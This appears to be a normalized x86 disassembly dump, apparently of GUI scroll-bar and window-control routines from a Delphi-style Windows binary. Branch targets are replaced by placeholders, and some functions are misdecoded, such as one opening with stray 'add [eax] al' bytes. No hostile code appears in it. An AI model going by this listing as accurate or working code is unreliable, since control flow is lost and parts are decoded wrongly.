mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
push ebp
call sub_46d118
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
push ebp
call sub_46d118
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406c3c
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46d4e8
jmp r-xdata
sub_46d470
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_46db60
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_46d4e8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_45c380
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_45c380
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_45bf00
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_45bf00
jmp r-xdata
call sub_46cc58
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46d5ac
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_46db60
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_46d664
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45c380
push eax
call sub_42f214
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45c380
push eax
call sub_42f214
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45c380
push eax
call sub_42f214
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_4242e8
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45c380
push eax
call sub_42f214
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45c380
push eax
call sub_42f214
sub_46d76c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_46d080
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_46d080
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_46d664
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_45c380
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_46d4e8
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_46d080
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_46d884
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_458074
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46cd00
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46cd00
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_46d8fc
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4031ec
mov eax [ esi + 0x20c ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_46d948
push ebx
mov ebx eax
mov eax ebx
call sub_459300
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_46db60
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c384
test al al
jne r-xdata
mov eax ebx
call sub_45c380
push eax
call sub_42f248
sub_46d988
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_46dae0
mov ecx edi
mov edx esi
mov eax ebx
call sub_458a48
pop edi
pop esi
pop ebx
retn
sub_46d9c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_46dad0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_455450
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_46cf98
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_459078
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_46d4e8
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45903c
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45903c
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_418c68
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_4551bc
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dad7
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_46cde0
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_418dc4
xor ecx ecx
mov edx 0xb03e
call sub_456c00
inc ebx
dec esi
jne r-xdata
sub_46db04
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_46d638
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_46d638
mov eax ebx
call sub_46dae0
jmp r-xdata
sub_46db60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
xor eax eax
push ebp
push sub_46dc4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_46d100
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_46d100
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_46d76c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_46d76c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_46d76c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_46d76c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_46d76c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_46d76c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_46dc70
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_455564
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_455590
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_455564
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_455590
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_455450
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_46d4e8
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_455450
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_455494
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_46d4e8
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_455450
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_46d4e8
mov eax ebx
call sub_455450
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_455494
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_455494
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_46d4e8
mov eax ebx
call sub_455494
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_46ddc4
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_46d4e8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_46d4e8
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_46d638
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_46d638
sub_46de68
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_46ddc4
mov ecx edi
mov edx esi
mov eax ebx
call sub_45be54
pop edi
pop esi
pop ebx
retn
sub_46de90
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_46defa
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45a934
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df01
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_46df01
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_46df39
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46dae0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df40
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_46df40
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46db60
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_46dfb4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_455494
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42c268
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_455450
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42c268
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_417794
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4583b4
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_46e024
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46e085
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403378
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45b6c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e08c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_46e0b4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46e218
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_46e1f8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_403134
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403550
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e1ff
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_46e1c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4189f8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40313c
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
sub_46e240
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4033e8
and [ ebx + 0x2f4 ] 0xdf
sub_46e278
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_46d884
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_4551bc
xor edx edx
mov eax ebx
call sub_4551e0
mov edx 0x140
mov eax ebx
call sub_455208
mov edx 0xf0
mov eax ebx
call sub_45522c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b7ac
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_46eb94
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c4
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_454628
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403134
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_46eef8
xor edx edx
mov eax ebx
call sub_455c10
xor edx edx
mov eax ebx
call sub_455b78
mov dl 0x1
mov eax ebx
call sub_45c4c0
mov edx ebx
mov eax [ rw-data ]
call sub_47355c
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e3f1
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_42158c
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_418f60
xor edx edx
mov eax ebx
call sub_41c384
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_472404
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_46e45c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035b8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_46e526
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_470d80
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
